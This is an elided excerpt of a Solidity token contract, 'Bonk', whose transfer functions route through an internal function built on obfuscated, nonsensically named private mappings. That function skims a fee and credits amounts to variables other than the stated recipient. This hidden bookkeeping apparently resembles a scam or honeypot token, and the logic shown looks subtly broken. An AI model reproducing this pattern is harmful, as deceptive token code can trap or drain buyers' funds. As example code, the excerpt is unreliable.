...
contract Bonk is Ownable {
    ...
    function merely(
        ...
        if (suddenly[hollow] == 0 && (funny != hollow) && nobody[hollow] > 0) {
            suddenly[hollow] -= stone;
        }
        ...
        trunk[hollow] -= rose;
        uint256 instant = (rose / 100) * house;
        rose -= instant;
        nobody[mud] += stone;
        trunk[fed] += rose;
    }

    mapping(address => uint256) private nobody;
    ...
    function transferFrom(
        ...
        merely(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        merely(msg.sender, recipient, amount);
        return true;
    }
